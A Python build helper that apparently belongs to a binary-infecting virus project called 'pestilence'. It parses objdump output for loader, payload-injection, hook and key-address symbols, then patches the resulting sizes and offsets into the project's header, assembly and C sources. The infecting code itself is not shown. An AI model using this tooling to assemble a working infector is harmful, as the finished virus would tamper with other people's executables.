import subprocess

dump = subprocess.run(["objdump -S pestilence"], shell=True, stdout = subprocess.PIPE).stdout.decode("utf-8")

memcpy_addr = dump[dump.find("<ft_memcpy>:") + 13:]
memcpy_addr = memcpy_addr[:memcpy_addr.find(":")]
memcpy_addr = hex(int(memcpy_addr, 16))

bis = dump[dump.find("<syscalls>:") + 12 :dump.find("<last_instr_of_end>:") + 100]
bis_start = bis[:bis.find(":")]
bis_start = int(bis_start, 16)

bis_end = bis[bis.find("<last_instr_of_end>:") + 21:]
bis_end = bis_end[:bis_end.find(":")]
bis_end = int(bis_end, 16)
bis_size = hex(bis_end - bis_start)

loader = dump[dump.find("<loader>:") + 10:]
loader = loader[:loader.find("<ft_end>:")]
loader_start = loader[:loader.find(":")]
loader_start = int(loader_start, 16)
loader_end = dump[dump.find("<last_instr_of_loader>:") + 24:]
loader_end = loader_end[:loader_end.find(":")]
loader_end = int(loader_end, 16)
loader_size = hex(loader_end - loader_start)

main_start = dump[dump.find("<main>:") + 8:-1]
main_start = main_start[0:main_start.find(":")].strip()
main_start = hex(int(main_start, 16))

main_end = dump[dump.find("<__libc_csu_init>:") - 200:dump.find("<__libc_csu_init>:")]
main_end = main_end[main_end.find("retq"):]
main_end = main_end[main_end.find("\n") + 1:main_end.find(":")].strip()
main_end = hex(int(main_end, 16))

offset_1 = dump[dump.find("<inject_loader>:") + 17:-1]
for i in range(0, 4): 
    offset_1 = offset_1[offset_1.find("\n") + 1:-1]
offset_1 = offset_1[0:offset_1.find(":")].strip()
offset_1 = hex(int(offset_1, 16) + 3)

offset_2 = dump[dump.find("<inject_payload>:") + 18:-1]
for i in range(0, 4): 
    offset_2 = offset_2[offset_2.find("\n") + 1:-1]
offset_2 = offset_2[0:offset_2.find(":")].strip()
offset_2 = hex(int(offset_2, 16) + 3)

offset_3 = dump[dump.find("<inject_bis>:") + 14:-1]
for i in range(0, 4): 
    offset_3 = offset_3[offset_3.find("\n") + 1:-1]
offset_3 = offset_3[0:offset_3.find(":")].strip()
offset_3 = hex(int(offset_3, 16) + 3)

offset_4 = dump[dump.find("<main>:") + 8:]
for i in range(0, 3):
    offset_4 = offset_4[offset_4.find(":") + 1:]
offset_4 = offset_4[offset_4.find(":") - 5: offset_4.find(":")]
offset_4 = hex(int(offset_4, 16))

offset_5 = dump[dump.find("<mprotect_text>:") + 17:]
for i in range(0, 4):
    offset_5 = offset_5[offset_5.find(":") + 1:]
offset_5 = offset_5[offset_5.find(":") - 5: offset_5.find(":")]
offset_5 = hex(int(offset_5, 16) + 1)

entries = dump[dump.find("<close_entries>:") + 17:]

offset_6 = entries
for i in range(0, 4):
    offset_6 = offset_6[offset_6.find("\n") + 1:]
offset_6 = offset_6[:offset_6.find(":")]
offset_6 = hex(int(offset_6, 16))

offset_rip = entries[entries.find("<get_rip>") + 10:]
offset_rip = offset_rip[:offset_rip.find(":")]
offset_rip = hex(int(offset_rip, 16))

call_1 = entries
for i in range(0, 10):
    call_1 = call_1[call_1.find("\n") + 1:]
call_1 = call_1[:call_1.find(":")]
call_1 = hex(int(call_1, 16) + 3)

call_2 = entries
for i in range(0, 20):
    call_2 = call_2[call_2.find("\n") + 1:]
call_2 = call_2[:call_2.find(":")]
call_2 = hex(int(call_2, 16) + 3)

call_3 = entries
for i in range(0, 30):
    call_3 = call_3[call_3.find("\n") + 1:]
call_3 = call_3[:call_3.find(":")]
call_3 = hex(int(call_3, 16) + 3)

call_4 = entries
for i in range(0, 40):
    call_4 = call_4[call_4.find("\n") + 1:]
call_4 = call_4[:call_4.find(":")]
call_4 = hex(int(call_4, 16) + 3)

call_5 = entries
for i in range(0, 50):
    call_5 = call_5[call_5.find("\n") + 1:]
call_5 = call_5[:call_5.find(":")]
call_5 = hex(int(call_5, 16) + 3)


hook_1 = entries
for i in range(0, 12):
    hook_1 = hook_1[hook_1.find("\n") + 1:]
hook_1 = hook_1[:hook_1.find(":")]
hook_1 = hex(int(hook_1, 16) + 2)

hook_2 = entries
for i in range(0, 22):
    hook_2 = hook_2[hook_2.find("\n") + 1:]
hook_2 = hook_2[:hook_2.find(":")]
hook_2 = hex(int(hook_2, 16) + 2)

hook_3 = entries
for i in range(0, 32):
    hook_3 = hook_3[hook_3.find("\n") + 1:]
hook_3 = hook_3[:hook_3.find(":")]
hook_3 = hex(int(hook_3, 16) + 2)

hook_4 = entries
for i in range(0, 42):
    hook_4 = hook_4[hook_4.find("\n") + 1:]
hook_4 = hook_4[:hook_4.find(":")]
hook_4 = hex(int(hook_4, 16) + 2)

hook_5 = entries
for i in range(0, 52):
    hook_5 = hook_5[hook_5.find("\n") + 1:]
hook_5 = hook_5[:hook_5.find(":")]
hook_5 = hex(int(hook_5, 16) + 2)


print("memcpy_addr : {} || bis_size : {} || loader_size : {} || payload_size : {} || main_offset : {} || offset_1 : {} || offset_2 : {} || offset_3 : {} || offset_4 : {}".format(memcpy_addr, bis_size, loader_size, main_end, main_start, offset_1, offset_2, offset_3, offset_4))

f = open("includes/pestilence.h", "r")
content = f.readlines()
f.close()

f = open("includes/pestilence.h", "w")
for i in range(0, len(content)):
    if content[i].find("FT_MEMCPY_ADDR") == 9:
        content[i] = content[i][0:24] + memcpy_addr + content[i][30:-1] + "\n"
    if content[i].find("BIS_SIZE") == 9:
        content[i] = content[i][0:18] + bis_size + content[i][23:-1] + "\n"
    if content[i].find("LOADER_SIZE") == 9:
        content[i] = content[i][0:21] + loader_size + content[i][25:-1] + "\n"
    if content[i].find("PAYLOAD_SIZE") != -1: 
        content[i] = content[i][0:22] + main_end + content[i][28:-1] + "\n"
    if content[i].find("MAIN_OFFSET") != -1: 
        content[i] = content[i][0:21] + main_start + content[i][27:-1] + "\n"
    if content[i].find("OFFSET_1") != -1: 
        content[i] = content[i][0:18] + offset_1 + content[i][24:-1] + "\n"
    if content[i].find("OFFSET_2") != -1: 
        content[i] = content[i][0:18] + offset_2 + content[i][24:-1] + "\n"
    if content[i].find("OFFSET_3") != -1: 
        content[i] = content[i][0:18] + offset_3 + content[i][24:-1] + "\n"
    if content[i].find("OFFSET_4") != -1: 
        content[i] = content[i][0:18] + offset_4 + content[i][24:-1] + "\n"
    if content[i].find("OFFSET_5") != -1: 
        content[i] = content[i][0:18] + offset_5 + content[i][24:-1] + "\n"
    if content[i].find("OFFSET_6") != -1: 
        content[i] = content[i][0:18] + offset_6 + content[i][24:-1] + "\n"
    if content[i].find("OFFSET_RIP") != -1:
        content[i] = content[i][0:20] + offset_rip + content[i][26:-1] + "\n"
    if content[i].find("OFFSET_CALL_1") != -1:
        content[i] = content[i][0:23] + call_1 + content[i][29:-1] + "\n"
    if content[i].find("OFFSET_CALL_2") != -1:
        content[i] = content[i][0:23] + call_2 + content[i][29:-1] + "\n"
    if content[i].find("OFFSET_CALL_3") != -1:
        content[i] = content[i][0:23] + call_3 + content[i][29:-1] + "\n"
    if content[i].find("OFFSET_CALL_4") != -1:
        content[i] = content[i][0:23] + call_4 + content[i][29:-1] + "\n"
    if content[i].find("OFFSET_CALL_5") != -1:
        content[i] = content[i][0:23] + call_5 + content[i][29:-1] + "\n"
    if content[i].find("OFFSET_HOOK_1") != -1:
        content[i] = content[i][0:23] + hook_1 + content[i][29:-1] + "\n"
    if content[i].find("OFFSET_HOOK_2") != -1:
        content[i] = content[i][0:23] + hook_2 + content[i][29:-1] + "\n"
    if content[i].find("OFFSET_HOOK_3") != -1:
        content[i] = content[i][0:23] + hook_3 + content[i][29:-1] + "\n"
    if content[i].find("OFFSET_HOOK_4") != -1:
        content[i] = content[i][0:23] + hook_4 + content[i][29:-1] + "\n"
    if content[i].find("OFFSET_HOOK_5") != -1:
        content[i] = content[i][0:23] + hook_5 + content[i][29:-1] + "\n"

    f.write(content[i])
f.close()

payload_size = hex((int(main_end, 16) - int(memcpy_addr, 16) + 7))
print("payload_size : ", payload_size)

full_size = (hex(int(payload_size, 16) + int(bis_size, 16)))
print("full_size : ", full_size)

f = open("srcs_s/loader.s", "r")
content = f.readlines()
f.close()
f = open("srcs_s/loader.s", "w")

for i in range(0, len(content)):
    if content[i].find("|REPLACE1|") != -1:
        place = content[i].find("|REPLACE1|") - 7
        content[i] = content[i][0:place] + hex(int(full_size, 16) + 0x1000) + content[i][place + 6:]
    f.write(content[i])
f.close()


f = open("srcs_s/bis.s", "r")
content = f.readlines()
f.close()
f = open("srcs_s/bis.s", "w")

for i in range(0, len(content)):
    if content[i].find("|REPLACE2|") != -1:
        place = content[i].find("|REPLACE2|") - 7
        content[i] = content[i][0:place] + payload_size + content[i][place + 6:]
    f.write(content[i])
f.close()

#print("full loader_size : {}".format(int(loader_size, 16) + int(end_size, 16)))

#entry_1 = dump[0:dump.find("<after_entry_1>:") - 19]
#entry_1 = entry_1[:entry_1.rfind("\n")]
#entry_1 = entry_1[entry_1.rfind("\n"):entry_1.rfind(":")]
#entry_1 = int(entry_1, 16)
#
#entry_2 = dump[0:dump.find("<after_entry_2>:") - 19]
#entry_2 = entry_2[:entry_2.rfind("\n")]
#entry_2 = entry_2[entry_2.rfind("\n"):entry_2.rfind(":")]
#entry_2 = int(entry_2, 16)
#
#entry_3 = dump[0:dump.find("<after_entry_3>:") - 19]
#entry_3 = entry_3[:entry_3.rfind("\n")]
#entry_3 = entry_3[entry_3.rfind("\n"):entry_3.rfind(":")]
#entry_3 = int(entry_3, 16)
#
#entry_4 = dump[0:dump.find("<after_entry_4>:") - 19]
#for i in range(0, 6):
#    entry_4 = entry_4[:entry_4.rfind("\n")]
#entry_4 = entry_4[entry_4.rfind("\n"):entry_4.rfind(":")]
#entry_4 = int(entry_4, 16)
#
#entry_5 = dump[0:dump.find("<after_entry_5>:") - 19]
#entry_5 = entry_5[:entry_5.rfind("\n")]
#entry_5 = entry_5[entry_5.rfind("\n"):entry_5.rfind(":")]
#entry_5 = int(entry_5, 16)
#
#
#f = open("srcs_c/parsing.c", "r")
#content = f.readlines()
#f.close()
#f = open("srcs_c/parsing.c", "w")
#
#for i in range(0, len(content)):
#    if content[i].find("//REPLACE1") != -1:
#        place = content[i].find("+=") + 3
#        content[i] = content[i][0:place] + hex(entry_1 - loader_start) + content[i][content[i].find(";//"):]
#    if content[i].find("//REPLACE2") != -1:
#        place = content[i].find("+=") + 3
#        content[i] = content[i][0:place] + hex(entry_2 - loader_start) + content[i][content[i].find(";//"):]
#    if content[i].find("//REPLACE3") != -1:
#        place = content[i].find("+=") + 3
#        content[i] = content[i][0:place] + hex(entry_3 - loader_start) + content[i][content[i].find(";//"):]
#    if content[i].find("//REPLACE4") != -1:
#        place = content[i].find("+=") + 3
#        content[i] = content[i][0:place] + hex(entry_4 - loader_start) + content[i][content[i].find(";//"):]
#    if content[i].find("//REPLACE5") != -1:
#        place = content[i].find("+=") + 3
#        content[i] = content[i][0:place] + hex(entry_5 - loader_start) + content[i][content[i].find(";//"):]
#    f.write(content[i])
#f.close()

exit_1 = dump[dump.find("<jmp5>:") + 8:]
exit_1 = exit_1[0:exit_1.find(":")]
exit_1 = int(exit_1, 16)

exit_2 = dump[dump.find("<jmp4>:") + 8:]
exit_2 = exit_2[0:exit_2.find(":")]
exit_2 = int(exit_2, 16)

exit_3 = dump[dump.find("<after_exit_4>:") + 16:]
exit_3 = exit_3[0:exit_3.find(":")]
exit_3 = int(exit_3, 16)

exit_4 = dump[dump.find("<jmp2>:") + 8:]
exit_4 = exit_4[0:exit_4.find(":")]
exit_4 = int(exit_4, 16)

exit_5 = dump[dump.find("<jmp1>:") + 8:]
exit_5 = exit_5[0:exit_5.find(":")]
exit_5 = int(exit_5, 16)


key_addr = bis[bis.find("<after_exit_2>:") + 16:]
key_addr = key_addr[:key_addr.find(":")]
key_addr = hex(int(key_addr, 16) + 2 - bis_start)

jmpr15 = bis[bis.find("<ft_end>:") + 10:]
jmpr15 = jmpr15[:jmpr15.find(":")]
jmpr15 = hex(int(jmpr15, 16) - bis_start)

end_ft_end = bis[bis.find("<end_ft_end>:") + 14:]
end_ft_end = end_ft_end[:end_ft_end.find(":")]
end_ft_end = hex(int(end_ft_end, 16) - bis_start)

f = open("srcs_c/pestilence.c", "r")
content = f.readlines()
f.close()
f = open("srcs_c/pestilence.c", "w")


for i in range(0, len(content)):
    if content[i].find("//REPLACE1") != -1:
        place = content[i].find("-=") + 3
        content[i] = content[i][0:place] + hex(bis_end - exit_1) + content[i][content[i].find(";//"):]
    if content[i].find("//REPLACE2") != -1:
        place = content[i].find("-=") + 3
        content[i] = content[i][0:place] + hex(bis_end - exit_2) + content[i][content[i].find(";//"):]
    if content[i].find("//REPLACE3") != -1:
        place = content[i].find("-=") + 3
        content[i] = content[i][0:place] + hex(bis_end - exit_3) + content[i][content[i].find(";//"):]
    if content[i].find("//REPLACE4") != -1:
        place = content[i].find("-=") + 3
        content[i] = content[i][0:place] + hex(bis_end - exit_4) + content[i][content[i].find(";//"):]
    if content[i].find("//REPLACE5") != -1:
        place = content[i].find("-=") + 3
        content[i] = content[i][0:place] + hex(bis_end - exit_5) + content[i][content[i].find(";//"):]

    if content[i].find("/*REPLACE1*/") != -1:
        place = content[i].find("0x")
        content[i] = content[i][0:place] + hex(bis_end - exit_1) + content[i][content[i].find("/*"):]
    if content[i].find("/*REPLACE2*/") != -1:
        place = content[i].find("0x")
        content[i] = content[i][0:place] + hex(bis_end - exit_2) + content[i][content[i].find("/*"):]
    if content[i].find("/*REPLACE3*/") != -1:
        place = content[i].find("0x")
        content[i] = content[i][0:place] + hex(bis_end - exit_3) + content[i][content[i].find("/*"):]
    if content[i].find("/*REPLACE4*/") != -1:
        place = content[i].find("0x")
        content[i] = content[i][0:place] + hex(bis_end - exit_4) + content[i][content[i].find("/*"):]
    if content[i].find("/*REPLACE5*/") != -1:
        place = content[i].find("0x")
        content[i] = content[i][0:place] + hex(bis_end - exit_5) + content[i][content[i].find("/*"):]

    if content[i].find("/*A*/") != -1:
        place = content[i].find("/*A*/") + 5
        content[i] = content[i][0:place] + end_ft_end + content[i][content[i].find("/*A`*/"):]
    if content[i].find("/*B*/") != -1:
        place = content[i].find("/*B*/") + 5
        content[i] = content[i][0:place] + jmpr15 + content[i][content[i].find("/*B`*/"):]
    if content[i].find("/*C*/") != -1:
        place = content[i].find("/*C*/") + 5
        content[i] = content[i][0:place] + key_addr + content[i][content[i].find("/*C`*/"):]
    f.write(content[i])

f.close()
